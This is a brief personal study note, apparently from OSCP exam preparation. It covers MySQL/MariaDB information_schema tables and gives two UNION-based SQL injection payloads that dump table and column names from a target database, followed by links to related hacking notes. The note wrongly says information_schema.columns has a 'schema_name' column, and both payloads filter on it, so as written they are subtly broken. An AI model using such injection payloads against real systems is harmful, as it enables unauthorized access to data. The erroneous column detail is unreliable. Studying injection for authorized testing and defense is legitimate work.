# mariadb mysql SQLi information tables

`information_schema` is name of metadata database
`information_schema.schemata` is names of databases in `schema_name` column
`information_schema.columns` is names of tables and columns 
  - column `column_name` has names of columns
  - column `table_name`
  - column `schema_name` is database name
Example union injection
`... union select 1,2,group_concat(concat(table_name, ':', column_name)) from information_schema.columns where schema_name='interesting_db'`
`... union select 1,2,group_concat(table_name, ':', column_name) from information_schema.columns where schema_name='interesting_db'`

` zet/20221003150984/README.md `

# Related

- [20221014185735](/zet/20221014185735/README.md) kb file named kb/hacking/methodology/sqli-manual-mysql-payloads.md
- [20221003151204](/zet/20221003151204/README.md) got access to databases - general SQL
- [20221012153512](/zet/20221012153512/README.md) database
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150987](/zet/20221003150987/README.md) mariadb mysql SQLi
- ~/kb/hacking/methodology/sqli-manual-mysql-payloads.md
- [20221003150985](/zet/20221003150985/README.md) mariadb mysql SQLi union injection

Tags:

    #hacking #sqli #database #info
